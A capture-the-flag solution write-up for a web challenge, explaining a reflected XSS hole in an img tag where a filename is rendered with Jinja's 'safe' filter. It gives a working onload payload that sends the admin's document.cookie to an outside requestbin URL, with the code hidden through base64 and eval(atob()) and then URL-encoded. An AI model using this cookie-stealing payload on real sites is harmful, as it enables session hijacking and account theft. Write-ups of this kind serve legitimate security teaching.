solution
=========

site displays the "filename" (in this case laid-back.jpg) by inserting it into an img tag like so:

```html
<img src="/static/{{ name | safe }}" alt="billboard">
```

this allows XSS. the attacker can try to display an image (before URL encoding) such as:

```html
laid-back.jpg" onload="[javascript code here]
```

to create

```html
<img src="/static/laid-back.jpg" onload="[javascript code here]" alt="billboard">
```

with this payload, we can steal cookies containing the flag from the admin by redirecting the page to a requestbin with the cookie smuggled in theparameter. the javascript code that canachieve this is:

```js
window.location.href = 'https://requestbin.io/12gaer71?cookie='+document.cookie;
```

however, we run into an issue. because there are slashes in the javascript code, the webserver interprets /requestbin.io as a location on the current server. to get around this, we can just base64 encode the payload and wrap it in `atob()` (javascript base64 decode), and then wrap that with `eval()` to execute the resulting decoded code. then URL encode the entire payload to get rid of spaces and quotes.

the final URL encoded payload looks like this:

`http://localhost:38256/display/laid-back.jpg%22%20onload=%22eval(atob('d2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9yZXF1ZXN0YmluLmlvLzEyZ2FlcjcxP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZTs='))`

once you have verified this payload works in your own browser, you can submit `/display/laid-back.jpg%22%20onload=%22eval(atob('d2luZG93LmxvY2F0aW9uLmhyZWYgPSAnaHR0cHM6Ly9yZXF1ZXN0YmluLmlvLzEyZ2FlcjcxP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZTs='))` to the admin bot.

the flag will be submitted to the requestbin where you can view it.